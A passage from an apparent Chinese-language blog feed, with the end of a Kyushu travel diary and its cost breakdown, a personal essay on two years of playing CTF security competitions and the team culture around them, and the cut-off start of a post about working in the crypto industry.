日幣。味道的話也是不錯，心得就跟之前吃 HIKARI 差不多。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__U0V94LVYX36ek6jzVvruYg.jpeg"></p><p>累積交通費用：9200 元（8950 + 250）<br>累積住宿費用：50700 元（48100 + 2600）<br>累積食物費用：14470 元（13320 + 1150）<br>累積娛樂費用：5950 元（4680 + 1270）</p><h3 id="5-月-21日-Day14：佐世保-佐賀"><a href="#5-月-21日-Day14：佐世保-佐賀" class="headerlink" title="5 月 21日 Day14：佐世保 &#x3D;&gt; 佐賀"></a>5 月 21日 Day14：佐世保 &#x3D;&gt; 佐賀</h3><p>原本是打算等十點退房然後看有什麼車可以搭，但前一天晚上在 Google Maps 突然看到有一台快九點發的列車票價比較便宜，而且錯過這班就沒了，趕快收行李出門。</p><p>從佐世保到佐賀也要個一個半小時，票價為 1310 日幣，然後佐世保站一樣不收 IC 卡，要用現金買票。</p><p>到佐賀先去這次住的 <a href="https://goo.gl/maps/kyQHRou1rg2D8Wuk8?coh=178573&entry=tt">APA 佐賀站南口</a>放行李，兩個晚上 4100 台幣。放完行李開始找一些「佐賀偶像是傳奇」的人孔蓋，這是一部背景在佐賀的動畫，就是看了這個才想來佐賀的。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__qVpLjTk8HLbARBNh5hiErQ.jpeg"></p><p>中午去吃了傳說中的佐賀牛，去的是<a href="https://goo.gl/maps/xtkhmvqE4C3xZrhe8?coh=178573&entry=tt">佐賀牛燒肉季樂本店</a>，禮拜天的中午整個佐賀都滿冷清的，很多商店都沒開，這一間人也不多。這間可以選擇烤肉或是鐵板燒，我們去吃了鐵板燒。</p><p>一個套餐 8420 日幣，折合台幣約 1950 元，以和牛來說差不多就是這個價。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__OWdaC17r0ALi__vSxRlvc5g.jpeg"></p><p>味道的話我自己是分不出來不同和牛的差別，我覺得跟我之前在台灣吃的和牛也差不多，就是都很好吃。</p><p>吃完以後繼續邊逛邊蒐集人孔蓋，後來還去了佐賀城參觀一下，不過那天唯一的缺點就是太熱了太陽太曬，很不適合走在路上閒晃，否則應該還滿舒服的。</p><p>晚上吃了飯店附近的超便宜拉麵，有多便宜？這麼便宜：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__5RJAmwyp0JgCQ8xb5YoQhg.jpeg"></p><p>我們兩個人才吃了 1000 日幣而已，而且重點是拉麵的味道還不錯，我覺得湯頭跟麵都有點一蘭的感覺，但是價錢只要一半，真是物超所值。</p><p>累積交通費用：9800 元（9200 + 600）<br>累積住宿費用：54800 元（50700 + 4100）<br>累積食物費用：18600 元（14470 + 4130）<br>累積娛樂費用：5950 元</p><h3 id="5-月-22日-Day15：佐賀一日遊"><a href="#5-月-22日-Day15：佐賀一日遊" class="headerlink" title="5 月 22日 Day15：佐賀一日遊"></a>5 月 22日 Day15：佐賀一日遊</h3><p>中午去吃了就在飯店附近的<a href="https://goo.gl/maps/QRcPywrYvTa1eYTi8?coh=178573&entry=tt">ドライブイン鳥佐賀店</a>，感覺是新開的，這一間在動畫裡面也有出現過，之前看動畫的時候就很想吃了。</p><p>招牌是雞肉，然後要自己烤。我覺得肉質不錯但是要自己烤有點麻煩，尤其是對我這種不太會烤肉的人，相比之下我更喜歡炸雞，然後炒飯的話味道就普普通通。兩個人吃下來是 2340 日幣。</p><p>接著下午則是到佐賀的 shopping mall Mallage 去逛，在那邊逛了一整個下午順便在遊樂場玩一下。</p><p>晚上不知道吃什麼直接選擇了超市，花了 2500 日幣，包含了水果跟飲料還有零食，吃得很滿足。</p><p>累積交通費用：10000 元（9800 + 200）<br>累積住宿費用：54800 元<br>累積食物費用：19700 元（18600 + 1100）<br>累積娛樂費用：5950 元</p><h3 id="5-月-23日-Day16：佐賀-柳川"><a href="#5-月-23日-Day16：佐賀-柳川" class="headerlink" title="5 月 23日 Day16：佐賀 &#x3D;&gt; 柳川"></a>5 月 23日 Day16：佐賀 &#x3D;&gt; 柳川</h3><p>早上退房之後就選擇搭公車前往柳川，大概要搭快一個小時，車資沒有記起來，先算個 500 日幣好了。</p><p>在柳川會待一個晚上，住的是<a href="https://goo.gl/maps/dLkJ1kFsk9gYvkHP7?coh=178573&entry=tt">若力旅館</a>，一個晚上 3500 元台幣。放完行李之後去吃附近的<a href="https://goo.gl/maps/SyBDHaThk83agRJQ6?coh=178573&entry=tt">元祖本吉屋</a>，是高檔的鰻魚飯：</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__n61__giybaESGFj____Mycx4w.jpeg"></p><p>兩個人花了 11000 日幣，點了一個定食跟一個單點，後來發現定食只多一個小菜而已，但價錢就差了 1000 多日幣，單點比較划算一點。</p><p>鰻魚飯的話確實跟其他鰻魚不一樣而且比較香，但我覺得相比之下我還是比較喜歡牛肉。我的意思是，一般的牛肉跟和牛的差別是我覺得最大的，比鰻魚跟高級鰻魚大滿多。</p><p>吃完之後到處晃了一下就跑到柳川搭船，一個人 1350 日幣。由於我們搭船的那個店家是跟 kkday 合作的，所以排隊的有不少台灣人跟香港人。乘船時間要一個小時，其實滿長的。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__1ig2UR1QBXbs__bhQtpIyiA.jpeg"></p><p>心得是可以嘗試一次，但最好挑太陽不要這麼大的時候，不然真的是滿熱的。而且因為人很多所以船是整個坐滿的，這麼小的位子坐一個小時也是挺累。</p><p>快到終點的時候看到隔壁船只有兩個人外加船上還有三層下午茶組合，見識到了金錢的力量。搭這種的應該滿不錯的，空間又大又有東西吃。</p><p>搭完之後就搭公車回去住宿處休息了。</p><p>睡個午覺起來以後也晚上了就去覓食，最後是吃了 <a href="https://goo.gl/maps/SH85D6brngYHikLH7?coh=178573&entry=tt">Ringer Hut</a> 這間連鎖餐廳，意外的喜歡。</p><p>這間餐廳有賣長崎名物「強棒麵」，然後還有一個是一堆青菜的版本，我跟我太太之前還在討論在日本外食似乎不太容易吃到足量的青菜，今天就吃到一個蔬菜超多的麵，我滿喜歡的，願意給予 4.5 顆星的好評。</p><p><img src="/img/2023-jp-travel-eed64a0cb3a0/1__JeJ1eZZhq6qWet6jbmRisQ.jpeg"></p><p>晚餐吃下來點了兩碗麵加上 6 顆餃子，大約 2000 日幣。</p><p>累積交通費用：10230 元（10000 + 230）<br>累積住宿費用：58300 元（54800 + 3500）<br>累積食物費用：22700 元（19700 + 3000）<br>累積娛樂費用：6570 元（5950 + 620）</p><h3 id="5-月-24日-Day17：柳川-福岡"><a href="#5-月-24日-Day17：柳川-福岡" class="headerlink" title="5 月 24日 Day17：柳川 &#x3D;&gt; 福岡"></a>5 月 24日 Day17：柳川 &#x3D;&gt; 福岡</h3><p>這天要搭船回福岡了，漸漸幫這次旅程做個收尾。</p><p>從柳川搭西鐵電車到福岡之後再轉地下鐵，車資大約一個人 1000 日幣，要一個小時左右。</p><p>最後住的是 <a href="https://goo.gl/maps/i3C9HE4CKUWAg1jv5?coh=178573&entry=tt">HOTEL TORIFITO HAKATA GION</a>，兩個晚上 5300 台幣。</p><p>放完行李我想說去博多運河船逛逛好了，結果搜尋之後才發現原來離住宿這麼近，走路大概十分鐘以內就到了。午餐的話直接在這邊解決，吃了 5F 拉麵競技場裡面的一個沾麵，味道普通，價格的話兩人 1700 日幣。</p><p>下午逛一逛還沒到三點，路過卡比之星咖啡廳覺得很可愛就進去吃了，點個飲料而已也花了 2400 日幣。</p><p>吃完之後照慣例回飯店休息睡覺，晚上在附近覓食，吃了松屋，兩個人約 1500 台幣。</p><p>累積交通費用：10690 元（10230 + 460）<br>累積住宿費用：63600 元（58300 + 5300）<br>累積食物費用：24000元（22700 + 1300）<br>累積娛樂費用：6570 元</p><h3 id="5-月-25日-Day18：福岡一日遊"><a href="#5-月-25日-Day18：福岡一日遊" class="headerlink" title="5 月 25日 Day18：福岡一日遊"></a>5 月 25日 Day18：福岡一日遊</h3><p>早上先搭車去太宰府，大約是早上 11 點左右抵達，到了之後就先去排一蘭拉麵。一蘭拉麵太宰府分店的特色是碗是五角形的，據我所知應該是唯二的特殊碗，另一間方形碗的在博多運河城那邊，這兩間我五六年前都去朝聖過了。</p><p>一碗的價格為 980 台幣，只收現金。然後太宰府分店比我想像中的小，只有 16 個位子而已，人多的話要等一段時間，像我們就等了二十幾分鐘左右。這次多點了一個半替玉，150 日幣，因此午餐的花費為 2110 日幣。</p><p>吃完之後就去太宰府晃晃繞了一圈，大概快一點的時候搭車回天神繼續逛，逛到大概三點多回飯店睡覺順便洗衣服。</p><p>大概五點多左右衣服洗好，再度出去逛街，晚餐想吃壽司但附近沒有壽司店，就吃了藏壽司，發現這次去的藏壽司是全自動的，進門之後輸入人數直接分配桌號給你，就直接進去座位了。</p><p>點餐的話跟台灣一樣，就平板或是直接拿就好。吃完之後自己走出去門口的自動結帳機結帳，全程自動化，完全不用跟人講到話，不知道是不是疫情後才這樣的。</p><p>因為晚上還想吃別的，在藏壽司沒有吃太多，兩個人才花了 1235 日幣。最後則是去了附近的超市再買一些點心跟吃的，花了 1367 日幣，因此晚餐總共是 2602 日幣。</p><p>累積交通費用：11150 元（10690 + 460）<br>累積住宿費用：63600 元<br>累積食物費用：25080 元（24000 + 1080）<br>累積娛樂費用：6570 元</p><h3 id="5-月-26日-Day19：福岡-台灣"><a href="#5-月-26日-Day19：福岡-台灣" class="headerlink" title="5 月 26日 Day19：福岡 &#x3D;&gt; 台灣"></a>5 月 26日 Day19：福岡 &#x3D;&gt; 台灣</h3><p>原本想說從住的地方應該有公車直接到國際線機場之類的，但查了一下發現似乎沒有，最後還是選擇了搭地鐵到機場然後再轉搭接駁公車。</p><p>到機場之後人似乎沒有想像中的多，check-in 之後就進管制區然後去貴賓室用電腦了。話說日本在出境的時候不是可以用那個自動通關嗎？放護照看鏡頭就可以過了，不用走人工通道，但我這四五次來日本，沒有一次成功，全部都失敗。</p><p>原因不明，我也不知道是為什麼，所以每次都要走人工通道。</p><p>國際線的航廈商店滿少的，沒什麼可以逛，貴賓室也很普通沒什麼東西。之後搭星宇回台灣也沒什麼特別好講的，就不多說了。</p><h3 id="花費總結與整體心得"><a href="#花費總結與整體心得" class="headerlink" title="花費總結與整體心得"></a>花費總結與整體心得</h3><p>（以下單位都是台幣）</p><h4 id="交通"><a href="#交通" class="headerlink" title="交通"></a>交通</h4><p>機票：23000 元<br>其他交通費用（火車、電車、公車、巴士等等）：11150 元<br>交通總計：34150 元<br>這次總共 19 天，不含機票的話一天交通費平均是 586 塊（兩個人）<br>一個人的話是 293 元</p><h4 id="住宿"><a href="#住宿" class="headerlink" title="住宿"></a>住宿</h4><p>累積住宿費用：63600 元<br>平均一天住宿費用為：3533 元<br>其中有兩天的住宿都是一泊二食，拉高不少平均<br>扣掉那兩晚的話，平均直接降低成 2675 元，看起來更合理了</p><h4 id="食物"><a href="#食物" class="headerlink" title="食物"></a>食物</h4><p>累積食物費用：25080 元<br>平均的話每一天為 1320 元，一個人是 660 元，因為我們通常不吃早餐所以一天兩餐的話，一餐就是 330 元</p><p>以我自己在日本這段期間看到的餐點價格來說，真的要省的話吃松屋或是其他在地餐廳，大概可以省到 500 ~ 700 日幣一餐。沒有特別省的話，我覺得平均一餐 1000 日幣是正常的（一碗拉麵差不多），這樣一餐就是 230 元。</p><p>所以最後平均算下來 330 元還行，畢竟中間有吃了比較貴的和牛鐵板燒跟鰻魚飯等等。不過中間有兩餐其實沒算到因為是一泊二食，所以平均應該要再高一點才對。</p><h4 id="娛樂"><a href="#娛樂" class="headerlink" title="娛樂"></a>娛樂</h4><p>娛樂費用為 6570 元，其實這次也沒特別看什麼東西，最貴的就是豪斯登堡門票，一個人要 1600 台幣，就佔了娛樂費用的一半。其他就是水族館門票跟船票之類的，都是三四百塊左右。</p><h4 id="花費總結"><a href="#花費總結" class="headerlink" title="花費總結"></a>花費總結</h4><p>累積交通費用：34150 元（26%）<br>累積住宿費用：63600 元（49%）<br>累積食物費用：25080 元（20%）<br>累積娛樂費用：6570 元（5%）</p><p>這次日本十九天十八夜，總共花了 129400 元，就算整數算個 13 萬好了。</p><p>話說其實實際的花費會更多，但有點難算所以就不寫進來了，包括投幣機買飲料啦，便利商店跟超市買零食飲料啦，或者是各種小吃以及去玩夾娃娃機之類的，這些都沒有記進來，所以實際花費應該會多個一兩成左右。</p><p>喔對了，還有交通費用也是，基本上只把比較大的記進來，但是在市區搭公車隨便一趟平均下來也要 200 日幣，累積起來也是一些花費。</p><p>所以東加西加我猜總共大概 15 萬左右，我也不知道這樣算是花的多還是少，沒有比較基準。</p><h4 id="整體心得"><a href="#整體心得" class="headerlink" title="整體心得"></a>整體心得</h4><ol><li>九州其實滿多地方自駕會比較方便，因為公車跟電車都沒這麼多，可能半小時才一班之類的，而且天氣太熱的話走路也不太好走，能自駕的話是最好</li><li>這次旅程碰到最多的遊客應該是韓國人，再來是台灣人跟香港人</li><li>選飯店的時候要注意飯店位置，就算離車站很近也要看是哪種車，如果是路面電車的話就要三思，因為行李不好搬</li><li>Y1000 其實在東京跟福岡這種熱門地區以外的地方滿好買的，去了不少比較小的超市都有賣而且都還有很多罐</li><li>有時候在超市買點心零食花的錢還比正餐多</li></ol><p>下次還會去九州玩嗎？會，而且會先以自駕為主，因為自駕真的方便不少。而且九州真的很大，去將近三週我覺得大概也只玩到一點點而已，還有不少想去的地方沒有去到（阿蘇火山啦，高千穗峽啦等等）。</p><p>以上就是這次去九州的心得跟花費，供大家參考。</p>]]></content>
      
      
      <categories>
          
          <category> 旅遊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旅遊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>駭客的線上遊戲 CTF 遊玩兩年心得</title>
      <link href="/2023/05/16/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/"/>
      <url>/2023/05/16/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__qaaGL9RZh2kPOQ4Y1cYntQ.jpeg"></p><p>CTF，全名為 Capture the flag，直翻的話就是「奪旗」，是一種考驗資安技術的比賽。雖然說是比賽，但我更喜歡當作是一款線上遊戲在玩就是了（因為許多元素真的滿類似的）。</p><p>這個名為 CTF 的比賽誰都可以舉辦，你可以，我可以，獨眼龍也可以。基本上也是任何人都可以參加，沒有三百萬美金也可以。</p><p>那這個比賽比的是什麼？畢竟名字叫做奪旗嘛，就是要想辦法拿到這個「旗子」，那要怎麼拿到呢？這就有不同的方式了，先講最簡單的一種。例如說題目會給你一個網站的連結，跟你說旗子藏在網站主機的根目錄，你只要找到漏洞並且駭入這個網站，就可以拿到旗子了。</p><p>而這個「旗子」通常是一串文字，例如說 CTF{I_am_Flag} 之類的東西，把這串文字輸入到比賽網站後就可以拿到相對應的分數，這就是奪旗。</p><p>決定勝負的方式很簡單，跟籃球一樣，分數多的贏。如果一樣多，沒有延長賽可以打，而是看誰先到達那個分數。</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__UevEP4A2KHBRodCj7A5zrg.png"></p><p>可以注意到上面的記分板中有五個分類，代表的是不同種類的題目，每個分類的意義如下：</p><ol><li>misc：不能分在其他幾類的都分在這，有可能把 flag 藏在音檔或圖片裡面要你找出來，也有可能要你還原一個壞掉的 QRcode 等等，題目五花八門千奇百怪</li><li>web：就是剛剛的舉例，給你一個網站要你找到漏洞</li><li>pwn：給你一個 binary 的檔案要找到漏洞</li><li>reverse：逆向工程，只給你執行檔，你要試著逆向以後還原邏輯</li><li>crypto：密碼學相關題目，例如說給你加密過的檔案跟一些線索，你要還原出明文等等</li></ol><p>（這個分類並不是固定的，有些比賽會分出其他類別，例如說數位鑑識 forensic 或是區塊鏈 blockchain 等等）</p><p>有沒有覺得滿像線上遊戲的，還有分不同的職業可以選擇。</p><p>大多數玩家都是偏向某一個類別很強，但也有玩家是每個類別都強的。而且類別裡面的題目其實也超級廣，以 Web 來說光是不同程式語言就有不同的點可以考，JavaScript 跟 PHP 需要注意的點就滿不一樣，題目類別有些是考 server side 的漏洞，有些是考 client side 的，簡單來說就是廣到爆炸。</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__AB6sM4RcM20QreMckoz5Bw.png"></p><p>玩家有了，職業也有了，再來還缺什麼？沒錯，就是公會。</p><p>大多數 CTF 都是組隊參加的，以線上遊戲來比喻的話就是公會了。前面有提過 CTF 比賽任何人都可以舉辦，而這些比賽通常會註冊在一個叫做 <a href="https://ctftime.org/">CTF Time</a> 的非官方網站（畢竟這不是一個真正的線上遊戲，沒有所謂的「官方」，等等，那乾脆叫它「去中心化線上遊戲」好了，潮度++）。</p><p>每一場比賽都會有權重，透過一個統一的計算公式，可以算出每一支參賽隊伍在該比賽的得分，而這些得分就會顯示在這個網站上。每支隊伍取成績最好的前十場比賽加總，就會得到一個照總分來排名的排行榜。</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__x8s9lcZpGC1YML5MqF7Kfg.png"></p><p>可以把上圖理解為「全伺服器前十大公會」這種感覺，是不是越來越像線上遊戲了？</p><p>CTF 的主力玩家應該是學生，因為學生時間比較多而且剛接觸比較有熱情（？）。所以這個圈子裡很多人都超級年輕，甚至不少人在 20 歲以下，可能有點像電競圈的那種感覺？像我這種 29.5 歲的年紀算是滿老的了。</p><p>一場 CTF 比賽大多會進行 24~48 個小時，而且都在假日。有些重度玩家會打到天昏地暗，直接熬夜解題，但我年紀到了不太行，都是打到晚上十點十一點就去乖乖睡覺，隔天醒來看隊友花式 carry。</p><p>而很多公會也是以學校為單位的，例如說上圖中第十名的 Plaid Parliament of Pwning 就是 CMU 的隊伍。不過有些公會的分界也沒這麼明確啦，不一定真的都要是那個學校的人才可以加入。</p><p>除了這些學校戰隊以外，其實更多的是「以興趣為導向的公會」，也就是跟一般線上遊戲一樣，由志同道合的人所組成的。而且 CTF 這個遊戲預設就是沒有分伺服器的，全世界的人都在同一個伺服器遊玩，因此公會的成員通常也是來自世界各地（當然，你也可以因為溝通方便或是各種因素組一個地緣的公會）。</p><p>有些厲害的公會要加入還需要投履歷甚至是面試等等，而有些較為稀缺的職業則是熱門的招募對象，以線上遊戲來說就是「缺補缺範圍缺坦」之類的，像是密碼學就是一個相對稀缺的職業。</p><p>而且許多公會都會弄一個自己的形象網站，裡面放著公會以前的戰績或是成員名單等等，藉此試著招募到更多志同道合的人。</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__6UD7zi5gyAfP0T6CxQsmUA.png"></p><p>當然，你也可以跟桐人一樣當個 solo player，不進任何的公會。現實生活中也有一個像桐人般開掛的人物存在，叫做 geohot，曾經破解過 iOS 跟 PS3，單槍匹馬參加 CTF 還打贏一堆戰隊，更多事蹟可以參考：<a href="https://ithelp.ithome.com.tw/articles/10221093">CTF 的三十道陰影 — Day11: [Pwn] Tom Cruise of CTF</a>。</p><p>我一開始就是個 solo player，後來才被找進公會裡面。自己一個人打跟一群人一起打的感覺差很多，有人可以討論除了能夠互相切磋進步以外，也可以一起卡關一起崩潰，感覺真好。</p><p>CTF 對於公會的唯一限制就是一場比賽你只能選擇一支隊伍，不能同時橫跨兩個隊伍不然就算是作弊了。而我自己目前在兩個國際公會裡面，可以邊玩 CTF 邊練英文，聽起來很不錯對吧？雖然文法沒什麼進步，英文簡寫倒是學了不少。</p><p>如果你是 solo 玩家想進入公會的話，通常每個比賽都會用 Discord 頻道進行交流，有些會特別開一個招攬人才的 channel，可以在那邊逛逛，看一下有沒有自己喜歡的公會。</p><p>若是你想要讓公會自己來找你，還有一個方法就是想辦法增加能見度跟知名度，讓公會看到你。</p><p>在這個圈子裡面，所謂的辦法指的就是：</p><ol><li>解開別人解不開的題目（難題）</li><li>寫 writeup</li></ol><p>許多人去餐廳吃完飯不一定會寫 Google 評論，買完東西除非有優惠不然不會給評價，去旅遊也不會寫遊記，平時也不會寫技術文章；但是身為一個 CTF 玩家，大多數的人都會寫解題的心得筆記，稱之為 writeup（或是 write-up 或是乾脆簡寫成 wu 或 wp）</p><p>這是我自己滿喜歡 CTF 的一點，因為可以從其他玩家的 writeup 裡面學到一大堆新的技巧跟想法。像我自己的話因為本來就很愛寫東西，所以也是有空的話就會寫寫解題心得，最近一兩年部落格一大堆文章：</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__oRUM6PR5K4CGBd0CKlwy3Q.png"></p><p>以前剛開始的時候其實都寫英文的，畢竟這個圈子是國際性的，英文還是能見度最高的語言：</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__bbi2B20AoCqOJKH0CfXZOg.png"></p><p>除了為了自我的成長跟學習寫心得以外，許多比賽會要求前幾名的戰隊提交解題心得，以此證明真的有把題目解開。而有些比賽甚至會舉辦心得會外賽，只要心得寫得好，一樣能拿獎金。</p><p>我去年有為了 Google CTF 認真寫了一篇心得去投稿：<a href="https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/">Insecure Deserialization in JavaScript: GoogleCTF 2022 Web&#x2F;HORKOS Writeup</a>，最後拿到了 200 美金的獎金以及很有質感的紀念品：</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__lAfqmtF7c8ATKPYmexGxQw.jpeg"></p><p>講到錢錢，CTF 的比賽是有獎金跟獎品的，越大的公司辦的比賽獎品越好。以 Google CTF 2022 來說，第一名有大約台幣 40 萬，第二名 20 萬，第三名 10 萬。</p><p>LINE CTF 2023 前三名也依序有台幣 15 萬、10 萬跟 6 萬。</p><p>不過這些錢雖然看起來很多，但戰隊人數也不少（少則 10 人起跳，多可以多到 30 人甚至是 50 人或更多），分下來也沒有多少錢。而且比起分下來，更多的做法是作為戰隊基金，贊助之後出國比賽的費用。</p><p>有些 CTF 比賽都是跟隨著資安研討會一起舉辦的，而這些比賽通常都會有預賽，取前幾名進入決賽，才是正式拿到了 on-site 參加比賽的門票。</p><p>講到出國比賽，就不得不提 CTF 圈中的重頭戲：DEF CON CTF。</p><p>DEF CON 是一個每年都會在美國舉辦的資安研討會，許多最新的攻擊手法都會在那邊發表，而 DEF CON CTF 是其中的一個活動，也可以視為是 CTF 比賽中的最高殿堂。</p><p>有聽過資訊奧林匹亞競賽或是數學奧林匹亞競賽嗎？把 DEF CON CTF 想成是每年一度的 CTF 奧林匹亞競賽就對了，差不多是那種感覺。</p><p>不過雖然聽起來很盛大，但主辦單位還是民間團體，所以只會贊助基本的住宿（而且有限人數，我記得是 8 個），機票要自己負責。</p><p>因此有些戰隊就會把打比賽拿來的獎金存著當作公積金，贊助戰隊成員出國比賽，或有些戰隊會找贊助商來贊助，例如說台灣每年都會有至少一隊出去比賽，由政府單位以及其他公司贊助（延伸閱讀：<a href="https://www.ithome.com.tw/news/151209">DEF CON CTF資格賽，臺灣聯隊攜手獲得第二名，八月進軍賭城實體較勁</a>）</p><p>DEF CON CTF 的比賽方式也不是我開頭講的那種，而是另一種叫做 Attack &amp; Defense 的玩法，除了攻擊別人以外，你也要修復自己的服務，把漏洞修掉。這個模式更有競賽的感覺而且戰況瞬息萬變，除了考驗找出漏洞的能力以外，也更考驗選手們自行準備的 infrastructure。</p><p>我去年有幸參加了 DEF CON CTF，有寫了幾篇心得，結論是我好像想的太盛大了，實際參與就覺得有點失望，更詳細的心得可以參考這篇：<a href="/2022/08/16/def-con-30-ctf-final-2-4444cf3645e/">DEF CON 30 CTF final 遊記（中）</a></p><p>比起 CTF Time 的排行榜，各個戰隊最想拿到的應該還是 DEF CON CTF 的冠軍。</p><p>喔對了，因為 DEF CON CTF 決賽只取預賽的前十六名參加，機會很少，再加上每個隊伍都想要盡可能增加競爭力，所以最近一兩年 CTF 圈開始吹起了抱團的風氣。</p><p>下圖是 2022 年參賽隊伍的組成，紅色是最後的隊伍名稱，藍色跟綠色是隊伍的組成：</p><p><img src="/img/after-playing-hacker-game-ctf-for-two-years-12dbfb6a3adb/1__irTl0khBwVEL0D1PsaBKeQ.png"></p><p>像左下角的 <a href="mailto:&#66;&#97;&#x6c;&#x73;&#110;&#x2e;&#x32;&#x31;&#x37;&#64;&#x54;&#x53;&#x4a;&#x2e;&#116;&#119;">&#66;&#97;&#x6c;&#x73;&#110;&#x2e;&#x32;&#x31;&#x37;&#64;&#x54;&#x53;&#x4a;&#x2e;&#116;&#119;</a>，就是由 217 + Balsn + HITCON + TSJ 這四個隊伍組成，而 TSJ 又是由另外五支隊伍組成，可以說是全部台灣的隊伍都組成一隊來打 DEF CON CTF 了。而其他隊伍也不遑多讓，基本上都是由好幾個戰隊組成。</p><p>今年的話也有聽到各種風聲，許多小隊伍合併成一個大團，試圖增加自己的競爭力，才有能力與那些傳統老牌戰隊一決高下。預賽即將在五月底開打，到時候就可以知道有多少戰隊併在一塊了。</p><p>每個人看待 CTF 的方式都不同，有些人很認真當作一個比賽在對待，就算是熬夜通宵也要解出題目；有些人把 CTF 當成是一種學習資安技術的方式；也有些人覺得 CTF 中的題目與現實脫節，還是去找真的漏洞比較實在，不想花時間在 CTF 上面。</p><p>而我的話是把 CTF 當成是一款遊戲在玩，別人玩薩爾達王國之淚，我玩 CTF，為什麼呢？因為我還在國外旅遊所以沒時間玩王國之淚，等我回台灣就會立刻買來玩了。</p><p>我自己是把 CTF 當成遊戲，抱持著一種比較輕鬆的方式去看待勝負，壓力會小很多，碰到不喜歡或是胃口不對的題目就先跳關，先選自己喜歡的來解。而有時候雖然也會玩到深夜，但並不是因為想要拿冠軍，而是因為想把題目解出來，覺得自己真的很接近了，殊不知這也是人生四大錯覺之一，這個接近就跟「再五分鐘就到了」一樣，有好多個五分鐘。</p><p>而且這樣的態度或許也能讓自己的電競生涯持續更久一點，畢竟有很多人都是工作或家庭忙了，就開始慢慢淡出這個圈子，或更多的其實是畢業以後就慢慢不玩了。當作遊戲在玩代表玩了是會開心的，是會感到放鬆的，應該就能細水長流。</p><p>話說比起 CTF 競賽本身，我更喜歡的是這整個生態系，可以透過 CTF 找到許多志同道合的朋友。例如說前端安全，這個偏冷門的領域就可以在 CTF 圈中找到幾個同好，都研究著類似的議題。</p><p>我也喜歡這整個文化，大多數人都會分享自己的解題心得，大家可以一起討論有沒有更好的解法，教學相長。同時也能讓自己的眼界更為開闊，許多攻擊手法都令人歎為觀止，從沒想過還可以這樣用。</p><p>而有時候也會有額外的好處，例如說當你進了知名的戰隊以後，許多隊友其實都已經在資安公司工作，有機會獲得相關的工作機會以及推薦，就算最後沒有合作機會，至少也多出了許多人脈。</p><p>以上就是我接觸 CTF 這兩年以來的心得。</p><p>如果你有資安基礎又對 CTF 有興趣，可以先問問看自己學校有沒有相關的資源。若是沒有或者你根本不是學生的話，可以考慮先自己打個一陣子，同時在 Discord 群組裡面找找看有沒有相關的戰隊可以加入。</p><p>如果你不是技術背景，但看了文章以後對 CTF 很感興趣，可以參考這一系列的文章，作者的經驗比我豐富，文章也寫得比我精彩，寫了很多有趣的 CTF 故事：<a href="https://ithelp.ithome.com.tw/users/20121059/ironman/2810?sc=hot">CTF 的三十道陰影</a>。</p><p>也可以留言在文章底下，告訴我你對哪些細節有興趣想知道更多，或是有哪些想問的問題。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在加密貨幣世界工作 0.75 年後的感想</title>
      <link href="/2023/05/12/after-working-at-web3-industry-for-8-months-60954d84ff0e/"/>
      <url>/2023/05/12/after-working-at-web3-industry-for-8-months-60954d84ff0e/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/after-working-at-web3-industry-for-8-months-60954d84ff0e/1__aALCTHDXCeACQg__nbfGT9w.jpeg"></p><p>去年十一月的時候我有寫了一篇<a href="/2022/11/08/2022-updates-e2a3ae1c9a2e/">《近況更新：轉職資安的一年後》</a>，文章最後有提到我換去了一個做 Web3 的團隊，接觸了全新的工作內容。換團隊以後過了大概 9 個月，也就是標題所指的 0.75 年，寫篇心得來幫自己在加密貨幣產業相關業界打滾的職涯做個總結。</p><h3 id="加入前對於加密貨幣的了解"><a href="#加入前對於加密貨幣的了解" class="headerlink" title="加入前對於加密貨幣的了解"></a>加入前對於加密貨幣的了解</h3><p>先講一下自己加入前大概知道哪些東西。</p><p>區塊鏈跟加密貨幣的原理大概理解，也知道智慧合約在幹嘛，有用過交易所入金以及買賣加密貨幣，大概就是這一些。對 DeFi 什麼的完全不清楚，只知道是基於智慧合約開發的東西，但更深一點就不知道了。</p><p>之前一直對幣圈覺得反感，理由跟 <a href="https://medium.com/u/9d1ba7125c47">Yang Lin</a> 之前寫的《<a href="https://medium.com/@yanglin_68397/%E8%A8%8E%E5%8E%AD%E5%8D%80%E5%A1%8A%E9%8F%88%E7%9A%84%E6%88%91-%E5%8A%A0%E5%85%A5%E4%BA%86%E4%B8%80%E9%96%93%E5%8D%80%E5%A1%8A%E9%8F%88%E5%85%AC%E5%8F%B8-ec907c4f6392">討厭區塊鏈的我，加入了一間區塊鏈公司</a>》講的類似，大概就是覺得這個圈子充滿一堆詐騙，還有一堆公司為了用區塊鏈而用區塊鏈，根本沒有因為用了區塊鏈而解決額外的問題，只是為用而用。</p><p>也是因為這樣，通常對於工作的產業沒有限制的我，上次在求職時特別說明了：「不要加密貨幣相關產業」，不想跟這一塊扯上關係。</p><h3 id="進入團隊的契機"><a href="#進入團隊的契機" class="headerlink" 